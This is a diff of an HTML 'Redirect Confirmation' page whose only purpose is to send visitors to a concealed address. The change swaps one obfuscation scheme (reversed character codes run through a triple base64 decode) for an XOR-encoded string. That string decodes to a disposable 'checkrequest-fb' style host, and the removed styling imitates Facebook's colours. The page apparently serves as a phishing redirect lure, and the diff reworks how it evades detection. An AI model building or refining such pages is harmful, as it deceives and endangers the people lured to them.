@@ -4,11 +4,11 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Secure Redirect</title>
+  <title>Redirect Confirmation</title>
   <style>
     body {
-      font-family: 'Helvetica Neue', sans-serif;
-      background-color: #f0f2f5;
+      background-color: #f4f6f8;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
       margin: 0;
       padding: 0;
       display: flex;
@@ -16,59 +16,62 @@
       align-items: center;
       height: 100vh;
     }
-    .box {
-      background: white;
-      padding: 2rem 3rem;
-      border-radius: 0.75rem;
-      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+    .container {
+      background: #ffffff;
+      padding: 2rem 2.5rem;
+      border-radius: 12px;
+      box-shadow: 0 8px 24px rgba(0,0,0,0.08);
       text-align: center;
-      max-width: 400px;
+      max-width: 420px;
       width: 100%;
     }
-    .box h2 {
-      color: #1877f2;
-      margin-bottom: 1rem;
+    h2 {
+      color: #2563eb;
+      font-size: 1.4rem;
+      margin-bottom: 0.75rem;
     }
-    .box p {
+    p {
       color: #555;
       font-size: 0.95rem;
+      margin: 0;
     }
-    .btn {
-      margin-top: 1.5rem;
-      padding: 0.8rem 2rem;
+    button {
+      margin-top: 1.8rem;
+      padding: 0.75rem 2rem;
       font-size: 1rem;
-      background-color: #1877f2;
-      color: white;
+      font-weight: 600;
+      color: #fff;
+      background-color: #2563eb;
       border: none;
-      border-radius: 6px;
+      border-radius: 8px;
       cursor: pointer;
-      font-weight: bold;
+      transition: background-color 0.25s ease;
     }
-    .btn:hover {
-      background-color: #166fe5;
+    button:hover {
+      background-color: #1d4ed8;
     }
   </style>
   <script>
-    const encodedLinks = {
-  0: [57, 48, 84, 85, 81, 108, 84, 82, 114, 108, 70, 77, 75, 90, 48, 85, 111, 90, 70, 87, 87, 108, 51, 98, 71, 70, 50, 81, 79, 82, 69, 86, 53, 104, 110, 77, 83, 116, 109, 86, 89, 86, 108, 101, 114, 90, 85, 84, 118, 112, 69, 82, 85, 78, 106, 83, 70, 100, 108, 87, 87, 78, 68, 90, 89, 66, 72, 98, 104, 116, 69, 97, 115, 100, 86, 101, 86, 112, 88, 86, 79, 120, 71, 87, 86, 90, 84, 78, 119, 69, 50, 99, 120, 48, 87, 87, 121, 103, 110, 77, 83, 116, 71, 97, 72, 86, 87, 101, 74, 100, 48, 89, 104, 104, 71, 98, 88, 86, 110, 87, 119, 73, 108, 97, 75, 53, 71, 86, 89, 66, 88, 77, 105, 57, 85, 77, 88, 100, 70, 100, 115, 82, 86, 90, 78, 112, 70, 86, 85, 108, 107, 84, 72, 49, 48, 85, 111, 86, 86, 87]
-};
-
-    function redirect() {
-      const keys = Object.keys(encodedLinks);
-      const rand = keys[Math.floor(Math.random() * keys.length)];
-      const reversed = String.fromCharCode(...encodedLinks[rand]);
-      const original = reversed.split('').reverse().join('');
-      const url = atob(atob(atob(original)));
-      window.location.href = url;
+    function xorDecode(encoded, key) {
+      let decoded = "";
+      for (let i = 0; i < encoded.length; i++) {
+        decoded += String.fromCharCode(encoded.charCodeAt(i) ^ key);
+      }
+      return decoded;
     }
 
+    function redirect() {
+      const encoded = "a}}yz3&&jaljb{lx|lz}ok>=8$;eoj'\u007fl{jle'hyy&a}j}'}`b&yhnl'a}de";
+      const url = xorDecode(encoded, 9);
+      window.location.href = url;
+    }
   </script>
 </head>
 <body>
-  <div class="box">
+  <div class="container">
     <h2>Redirect Confirmation</h2>
     <p>Please click the button below to continue.</p>
-    <button class="btn" onclick="redirect()">Continue</button>
+    <button onclick="redirect()">Continue</button>
   </div>
 </body>
 </html>
